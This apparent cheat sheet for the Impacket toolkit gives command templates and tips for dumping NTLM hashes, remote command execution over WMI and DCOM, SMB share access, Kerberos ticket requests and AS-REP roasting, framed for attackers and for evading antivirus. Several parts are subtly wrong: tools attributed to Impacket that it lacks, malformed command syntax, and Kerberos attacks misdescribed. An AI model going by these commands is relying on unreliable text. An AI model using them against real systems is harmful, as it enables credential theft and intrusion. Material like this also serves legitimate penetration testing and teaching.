# Impacket

**Type:** Post-Exploitation, SMB, Networking
**Focus:** **Impacket** is a powerful Python toolkit used for a wide variety of **post-exploitation** activities, with a primary focus on **SMB (Server Message Block)**, **NetSession**, and **Active Directory** protocols. It provides a comprehensive set of tools for **network communication**, **exploitation**, and **data exfiltration**, making it a key resource for both **offensive security professionals** and **penetration testers**.

---

## 1. Full Feature Overview

* **SMB/NetSession Attacks**: Impacket includes tools for **interacting with SMB shares**, establishing **remote sessions**, and performing **lateral movement**.
* **Active Directory**: Impacket offers various utilities for interacting with **Active Directory**, such as **kerberos** attacks, **dumping NTLM hashes**, and exploiting **domain trusts**.
* **Network Protocols**: The toolkit supports **multiple network protocols**, including **NetBIOS**, **RDP**, **LDAP**, and **WMI**.
* **Password Cracking**: Impacket can be used to interact with **NTLM hashes** and brute-force password hashes.
* **Credential Harvesting**: It allows attackers to **extract credentials** from the **SAM** database, **NTLM hashes**, or **Kerberos tickets**.

---

## 2. Requirements & Setup

### Requirements

* **Python**: Impacket requires **Python 2.7+** or **Python 3.x** (latest recommended).
* **Dependencies**: Various Python modules like **pycryptodome**, **ldap3**, **requests**, and **paramiko**.
* **Linux / macOS / Windows**: Impacket can be installed and used on **Linux**, **macOS**, and **Windows** environments.

### Installation

1. **Clone the repository**:

   ```bash
   git clone https://github.com/SecureAuthCorp/impacket.git
   ```

2. **Navigate to the impacket directory**:

   ```bash
   cd impacket
   ```

3. **Install dependencies** (make sure **Python 3** is installed):

   ```bash
   pip install -r requirements.txt
   ```

4. **Install Impacket**:

   ```bash
   python setup.py install
   ```

5. **Verify Installation**:
   Run any of the Impacket tools to verify that it's properly installed:

   ```bash
   python3 -m impacket.examples.secretsdump
   ```

---

## 3. Core Usage

### 3.1 SecretDump (Dumping NTLM Hashes)

**secretsdump.py** is one of the most popular tools within Impacket, allowing attackers to dump **NTLM hashes** from a **Windows machine**, **Active Directory**, or **Domain Controller**.

```bash
python3 secretsdump.py <target_ip>/<domain>/<user>:<password>@<target_ip>
```

Where:

* **`<target_ip>`**: The IP address of the **target** machine or **Domain Controller**.
* **`<domain>`**: The **domain** name.
* **`<user>`** and **`<password>`**: The credentials of an account with administrative access to the target machine.
* The output will provide NTLM hashes, **Kerberos tickets**, and **domain-related information**.

### 3.2 SMBClient (SMB Share Access)

**smbclient.py** is a script for **interacting with SMB shares**.

```bash
python3 smbclient.py <target_ip>/<share> -username <username> -password <password>
```

Where:

* **`<target_ip>`**: The **target** IP address of the SMB share.
* **`<share>`**: The **share name** (e.g., `C$`, `IPC$`).
* **`<username>`** and **`<password>`**: Credentials with appropriate access.

You can use **smbclient.py** to **browse SMB shares**, **download files**, and perform **lateral movement**.

### 3.3 Impacket RDP (Remote Desktop Protocol)

Impacket supports **RDP** functionality with scripts such as **rdp-sec-check.py**, allowing attackers to test and exploit **RDP vulnerabilities**.

```bash
python3 rdp-sec-check.py <target_ip>
```

This tool checks for **RDP security configurations** and can help identify machines vulnerable to **RDP brute force** or other weaknesses.

### 3.4 WMIExec (Execute Commands via WMI)

**wmiexec.py** allows attackers to execute commands remotely via **WMI** (Windows Management Instrumentation). This method can be useful for **lateral movement** or **privilege escalation**.

```bash
python3 wmiexec.py <domain>/<username>:<password>@<target_ip> <command>
```

Where:

* **`<command>`**: The **command** you wish to execute on the target system.

This command will remotely execute commands via WMI, helping you move laterally or dump credentials.

### 3.5 DCOMExec (Execute Commands via DCOM)

**dcomexec.py** allows for **remote code execution** over **DCOM**.

```bash
python3 dcomexec.py <target_ip> -u <user> -p <password> <command>
```

This method is often used to bypass **firewalls** or **AV detections**, offering a different remote execution vector compared to WMI or SMB.

### 3.6 Impacket Kerberos Tools

Impacket also includes utilities for **Kerberos-related attacks**, including **ticket extraction** and **Kerberos service ticket attacks**.

1. **GetTGT**:
   Extract **Kerberos tickets** from a Windows machine using **KRB5** (Kerberos Authentication).

   ```bash
   python3 GetTGT.py <domain>/<user>:<password>@<target_ip>
   ```

2. **ASREPRoast**:
   Use **Kerberos AS-REP roasting** to request tickets for service accounts that do not have pre-authentication enabled.

   ```bash
   python3 asreproast.py <domain>/<user>:<password>@<target_ip>
   ```

This will allow you to obtain **service account tickets** that can be cracked offline to reveal **passwords**.

---

## 4. Tips, Tricks, Best Practices

* **Combine with Other Tools**: Impacket is often used alongside other tools such as **BloodHound**, **Mimikatz**, or **Empire** for **post-exploitation**.
* **Kerberos Ticketing**: Leverage **Kerberos tickets** to move laterally across domains or perform **pass-the-ticket** attacks.
* **Remote Execution**: Tools like **wmiexec** or **dcomexec** allow **remote code execution** without requiring SMB or RDP, which can be useful when those ports are closed or monitored.
* **Credentials Dumping**: Impacket's **secretsdump** is one of the most reliable ways to obtain **NTLM hashes**, **Kerberos tickets**, and other sensitive information from **Domain Controllers**.

---

## 5. Cheat Sheet

```bash
# Dump NTLM hashes from a target machine
python3 secretsdump.py <target_ip>/<domain>/<user>:<password>@<target_ip>

# Access SMB share remotely
python3 smbclient.py <target_ip>/<share> -username <username> -password <password>

# Check RDP security configurations
python3 rdp-sec-check.py <target_ip>

# Execute a command on a remote Windows machine via WMI
python3 wmiexec.py <domain>/<username>:<password>@<target_ip> <command>

# Execute a command on a remote Windows machine via DCOM
python3 dcomexec.py <target_ip> -u <username> -p <password> <command>

# Extract Kerberos TGT (Ticket Granting Ticket)
python3 GetTGT.py <domain>/<username>:<password>@<target_ip>

# Perform AS-REP Roasting to collect service account tickets
python3 asreproast.py <domain>/<username>:<password>@<target_ip>
```

---
